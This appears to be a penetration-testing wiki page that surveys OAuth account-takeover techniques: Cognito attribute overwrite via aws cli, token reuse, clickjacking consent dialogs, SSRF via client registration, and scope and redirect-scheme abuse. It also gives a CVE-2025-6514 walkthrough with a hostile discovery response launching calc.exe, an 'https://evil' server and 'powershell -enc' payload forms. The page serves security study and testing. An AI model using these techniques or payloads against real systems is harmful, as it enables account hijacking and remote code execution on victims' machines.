# OAuth to Account Takeover - Advanced Attacks

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.

```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
    "CodeDeliveryDetailsList": [
        {
            "Destination": "i***@f***.com",
            "DeliveryMedium": "EMAIL",
            "AttributeName": "email"
        }
    ]
}
```

For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows that expect to receive the **token** (and not a code) could be vulnerable if they not check that the token belongs to the app.

This is because an **attacker** could create an **application supporting OAuth and login with Facebook** (for example) in his own application. Then, once a victim logins with Facebook in the **attackers application**, the attacker could get the **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> Therefore, if the attacker manages to get the user access his own OAuth application, he will be able to take over the victims account in applications that are expecting a token and aren't checking if the token was granted to their app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), it was possible to make a victim open a page with a **returnUrl** pointing to the attackers host. This info would be **stored in a cookie (RU)** and in a **later step** the **prompt** will **ask** the **user** if he wants to give access to that attackers host.

To bypass this prompt, it was possible to open a tab to initiate the **Oauth flow** that would set this RU cookie using the **returnUrl**, close the tab before the prompt is shown, and open a new tab without that value. Then, the **prompt won't inform about the attackers host**, but the cookie would be set to it, so the **token will be sent to the attackers host** in the redirection.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), some OAuth implementations allows to indicate the **`prompt`** GET parameter as None (**`&prompt=none`**) to **prevent users being asked to confirm** the given access in a prompt in the web if they are already logged in the platform.

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), it might be possible to indicate the parameter **`response_mode`** to indicate where do you want the code to be provided in the final URL:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs are ideal clickjacking targets: if they can be framed, an attacker can overlay custom graphics, hide the real buttons, and trick users into approving dangerous scopes or linking accounts. Build PoCs that:

1. Load the IdP authorization URL inside an `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Use absolute positioning/opacity tricks to align fake buttons with the hidden **Allow**/**Approve** controls.
3. Optionally pre-fill parameters (scopes, redirect URI) so the stolen approval immediately benefits the attacker.

During testing verify that IdP pages emit either `X-Frame-Options: DENY/SAMEORIGIN` or a restrictive `Content-Security-Policy: frame-ancestors 'none'`. If neither is present, demonstrate the risk with tooling like [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) and record how easily a victim authorizes the attacker’s app. For additional payload ideas see [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), this is an OAuth flow that allows to login in OAuth via **username** and **password**. If during this simple flow a **token** with access to all the actions the user can perform is returned then it's possible to bypass 2FA using that token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) comments how it was possible to abuse an **open redirect** to the value from the **referrer** to abuse OAuth to ATO. The attack was:

1. Victim access the attackers web page
2. The victim opens the malicious link and an opener starts the Google OAuth flow with `response_type=id_token,code&prompt=none` as additional parameters using as **referrer the attackers website**.
3. In the opener, after the provider authorizes the victim, it sends them back to the value of the `redirect_uri` parameter (victim web) with 30X code which still keeps the attackers website in the referer.
4. The victim **website trigger the open redirect based on the referrer** redirecting the victim user to the attackers website, as the **`respose_type`** was **`id_token,code`**, the code will be sent back to the attacker in the **fragment** of the URL allowing him to tacke over the account of the user via Google in the victims site.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth serves as a less obvious but critical vector for security vulnerabilities, specifically for **Server-Side Request Forgery (SSRF)** attacks. This endpoint allows OAuth servers to receive details about client applications, including sensitive URLs that could be exploited.

**Key Points:**

- **Dynamic Client Registration** is often mapped to `/register` and accepts details like `client_name`, `client_secret`, `redirect_uris`, and URLs for logos or JSON Web Key Sets (JWKs) via POST requests.
- This feature adheres to specifications laid out in **RFC7591** and **OpenID Connect Registration 1.0**, which include parameters potentially vulnerable to SSRF.
- The registration process can inadvertently expose servers to SSRF in several ways:
  - **`logo_uri`**: A URL for the client application's logo that might be fetched by the server, triggering SSRF or leading to XSS if the URL is mishandled.
  - **`jwks_uri`**: A URL to the client's JWK document, which if maliciously crafted, can cause the server to make outbound requests to an attacker-controlled server.
  - **`sector_identifier_uri`**: References a JSON array of `redirect_uris`, which the server might fetch, creating an SSRF opportunity.
  - **`request_uris`**: Lists allowed request URIs for the client, which can be exploited if the server fetches these URIs at the start of the authorization process.

**Exploitation Strategy:**

- SSRF can be triggered by registering a new client with malicious URLs in parameters like `logo_uri`, `jwks_uri`, or `sector_identifier_uri`.
- While direct exploitation via `request_uris` may be mitigated by whitelist controls, supplying a pre-registered, attacker-controlled `request_uri` can facilitate SSRF during the authorization phase.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. The remote MCP server returns an attacker-controlled `authorization_endpoint` during the discovery exchange (`/.well-known/openid-configuration` or any metadata RPC). `mcp-remote ≤0.1.15` would then call the system URL handler (`start`, `open`, `xdg-open`, etc.) with whatever string arrived, so any scheme/path supported by the OS executed locally.

**Attack workflow**

1. Point the desktop agent to a hostile MCP/OAuth server (`npx mcp-remote https://evil`). The agent receives `401` plus metadata.
2. The server answers with JSON such as:

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "authorization_endpoint": "file:/c:/windows/system32/calc.exe",
  "token_endpoint": "https://evil/idp/token",
  ...
}
```

3. The client launches the OS handler for the supplied URI. Windows accepts payloads like `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux accept `file:///Applications/Calculator.app/...` or even custom schemes such as `cmd://bash -lc '<payload>'` if registered.
4. Because this happens before any user interaction, **merely configuring the client to talk to the attacker server yields code execution**.

**How to test**

- Target any OAuth-capable desktop/agent that performs discovery over HTTP(S) and opens returned endpoints locally (Electron apps, CLI helpers, thick clients).
- Intercept or host the discovery response and replace `authorization_endpoint`, `device_authorization_endpoint`, or similar fields with `file://`, `cmd://`, UNC paths, or other dangerous schemes.
- Observe whether the client validates the scheme/host. Lack of validation results in immediate execution under the user context and proves the issue.
- Repeat with different schemes to map the full attack surface (e.g., `ms-excel:`, `data:text/html,`, custom protocol handlers) and demonstrate cross-platform reach.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the sub field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- Some Authorization Servers do not ensure that these properties (like email) remain immutable.
- In certain implementations—such as **"Login with Microsoft"**—the client relies on the email field, which is **user-controlled by the user in Entra ID** and not verified.
- An attacker can exploit this by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.
- Even though the Object ID (stored in sub) is immutable and secure, the reliance on a mutable email field can enable an account takeover (for example, hijacking an account like victim@gmail.com).

## Client Confusion Attack

In a **Client Confusion Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.

## Scope Upgrade Attack

The **Authorization Code Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token** is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as client_id and scope, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.

## Redirect Scheme Hijacking

In mobile OAuth implementations, apps use **custom URI schemes** to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.

## References

- [Leaking FXAuth token via allowlisted Meta domains](https://ysamm.com/uncategorized/2026/01/16/leaking-fxauth-token.html)
- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
